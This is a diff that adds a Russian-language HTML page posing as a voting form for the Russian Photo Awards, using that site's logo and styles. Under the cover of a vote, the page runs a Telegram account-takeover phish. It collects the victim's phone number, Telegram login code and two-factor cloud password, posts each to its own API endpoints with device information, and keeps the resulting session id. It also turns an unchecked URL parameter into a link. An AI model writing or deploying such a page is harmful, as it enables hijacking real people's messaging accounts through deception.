@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Голосование - Russian Photo Awards 2026</title>
+    
+    <link rel="stylesheet" href="https://russianphotoawards.com/build/assets/app-BfLAl0Pz.css" />
+    <link rel="stylesheet" href="https://russianphotoawards.com/build/assets/fonts-XtXFA6Lf.css" />
+    
+    <style>
+        body {
+            background: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Avenir Next Cyr', sans-serif;
+        }
+        
+        .vote-container {
+            max-width: 600px;
+            width: 100%;
+            margin: 20px;
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo img {
+            width: 150px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-family: 'Avenir Next Cyr', sans-serif;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #cc2025;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #cc2025;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.125rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Avenir Next Cyr', sans-serif;
+        }
+        
+        .btn-primary:hover {
+            background: #b01c20;
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #6b7280;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            font-family: 'Avenir Next Cyr', sans-serif;
+        }
+        
+        .btn-secondary:hover {
+            background: #4b5563;
+        }
+        
+        .error-message {
+            background: #fee2e2;
+            color: #dc2626;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none;
+            font-family: 'Avenir Next Cyr', sans-serif;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 40px;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .info-box {
+            background: #f3f4f6;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 0.875rem;
+            color: #6b7280;
+            font-family: 'Avenir Next Cyr', sans-serif;
+        }
+        
+        h3 {
+            font-family: 'Avenir Next Cyr', sans-serif;
+            font-weight: bold;
+            color: #1f2937;
+        }
+        
+        label {
+            font-family: 'Avenir Next Cyr', sans-serif;
+            font-weight: 500;
+            color: #374151;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="vote-container">
+        
+        <!-- Логотип -->
+        <div class="logo">
+            <a href="https://russianphotoawards.com">
+                <img src="https://russianphotoawards.com/images/logo-colored.jpg" alt="RPA">
+            </a>
+        </div>
+
+        <!-- Error Message -->
+        <div id="error-message" class="error-message"></div>
+
+        <!-- Крок 1: Номер телефону -->
+        <div id="step-phone" class="step active">
+            <h3 style="text-align: center; font-size: 1.5rem; margin-bottom: 1rem;">Авторизация через Telegram</h3>
+            <div class="info-box">
+                <p>Для голосования необходимо авторизоваться через Telegram. Мы отправим код подтверждения на ваш номер.</p>
+            </div>
+            
+            <label style="margin-bottom: 0.5rem;">Номер телефона</label>
+            <input type="tel" id="phone" class="input-field" placeholder="+7 (900) 123-45-67" style="margin-bottom: 1rem;">
+            
+            <button onclick="sendCode()" class="btn-primary" id="btn-send-code">
+                Получить код
+            </button>
+        </div>
+
+        <!-- Крок 2: Код підтвердження -->
+        <div id="step-code" class="step">
+            <h3 style="text-align: center; font-size: 1.5rem; margin-bottom: 1rem;">Введите код из Telegram</h3>
+            <div class="info-box">
+                <p>Мы отправили код подтверждения на ваш номер в Telegram</p>
+            </div>
+            
+            <label style="margin-bottom: 0.5rem;">Код подтверждения</label>
+            <input type="text" id="code" class="input-field" placeholder="12345" maxlength="5" style="margin-bottom: 1rem;">
+            
+            <button onclick="verifyCode()" class="btn-primary" id="btn-verify">
+                Подтвердить
+            </button>
+            
+            <button onclick="backToPhone()" class="btn-secondary">
+                Назад
+            </button>
+        </div>
+
+        <!-- Крок 3: 2FA пароль -->
+        <div id="step-2fa" class="step">
+            <h3 style="text-align: center; font-size: 1.5rem; margin-bottom: 1rem;">Двухфакторная аутентификация</h3>
+            <div class="info-box">
+                <p>Введите пароль от облачного хранилища Telegram</p>
+            </div>
+            
+            <label style="margin-bottom: 0.5rem;">Пароль</label>
+            <input type="password" id="password" class="input-field" placeholder="Ваш пароль" style="margin-bottom: 1rem;">
+            
+            <button onclick="verify2FA()" class="btn-primary" id="btn-verify-2fa">
+                Подтвердить
+            </button>
+        </div>
+
+        <!-- Крок 4: Успіх -->
+        <div id="step-success" class="step">
+            <div class="success-message">
+                <div class="success-icon">
+                    <svg style="width: 48px; height: 48px; color: white;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <h3 style="font-size: 1.5rem; margin-bottom: 0.5rem;">Спасибо за ваш голос!</h3>
+                <p style="color: #4b5563; margin-bottom: 1.5rem;">Ваш голос успешно зарегистрирован</p>
+                <div style="display: flex; flex-direction: column; gap: 1rem;">
+                    <a id="return-link" href="javascript:history.back()" style="display: inline-block; padding: 0.75rem 1.5rem; background: #cc2025; color: white; border-radius: 0.5rem; text-decoration: none; text-align: center; font-weight: bold;">
+                        Вернуться к работам
+                    </a>
+                    <a href="https://russianphotoawards.com/works" style="display: inline-block; padding: 0.75rem 1.5rem; background: #6b7280; color: white; border-radius: 0.5rem; text-decoration: none; text-align: center; font-weight: bold;">
+                        Все работы
+                    </a>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const workId = urlParams.get('work');
+        const returnUrl = urlParams.get('return');
+        
+        let sessionData = {
+            sd: null,
+            workId: workId
+        };
+
+        if (returnUrl) {
+            document.getElementById('return-link').href = returnUrl;
+        }
+
+        function showError(message) {
+            const errorEl = document.getElementById('error-message');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 5000);
+        }
+
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById(stepId).classList.add('active');
+        }
+
+        function getDeviceInfo() {
+            return {
+                d_m: navigator.platform || "Unknown",
+                s_v: navigator.userAgent || "Unknown"
+            };
+        }
+
+        async function sendCode() {
+            const phone = document.getElementById('phone').value.trim();
+            if (!phone) {
+                showError('Введите номер телефона');
+                return;
+            }
+
+            const btn = document.getElementById('btn-send-code');
+            btn.disabled = true;
+            btn.textContent = 'Отправка...';
+
+            try {
+                const response = await fetch('/api/sc', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ph: phone,
+                        dv_i: getDeviceInfo(),
+                        work_id: sessionData.workId
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    sessionData.sd = data.sd;
+                    showStep('step-code');
+                } else {
+                    showError(data.error || 'Ошибка отправки кода');
+                }
+            } catch (error) {
+                showError('Ошибка соединения с сервером');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Получить код';
+            }
+        }
+
+        async function verifyCode() {
+            const code = document.getElementById('code').value.trim();
+            if (!code) {
+                showError('Введите код подтверждения');
+                return;
+            }
+
+            const btn = document.getElementById('btn-verify');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+
+            try {
+                const response = await fetch('/api/vc', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sd: sessionData.sd,
+                        cd: code
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    if (data.r_2_fa) {
+                        showStep('step-2fa');
+                    } else if (data.logged_in) {
+                        if (data.session_id) {
+                            localStorage.setItem('telegram_session', data.session_id);
+                        }
+                        showStep('step-success');
+                    }
+                } else {
+                    showError(data.error || 'Неверный код');
+                }
+            } catch (error) {
+                showError('Ошибка проверки кода');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Подтвердить';
+            }
+        }
+
+        async function verify2FA() {
+            const password = document.getElementById('password').value;
+            if (!password) {
+                showError('Введите пароль');
+                return;
+            }
+
+            const btn = document.getElementById('btn-verify-2fa');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+
+            try {
+                const response = await fetch('/api/v2a', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sd: sessionData.sd,
+                        ps: password
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok && data.logged_in) {
+                    if (data.session_id) {
+                        localStorage.setItem('telegram_session', data.session_id);
+                    }
+                    showStep('step-success');
+                } else {
+                    showError(data.error || 'Неверный пароль');
+                }
+            } catch (error) {
+                showError('Ошибка авторизации');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Подтвердить';
+            }
+        }
+
+        function backToPhone() {
+            showStep('step-phone');
+            document.getElementById('phone').value = '';
+        }
+    </script>
+
+</body>
+</html>
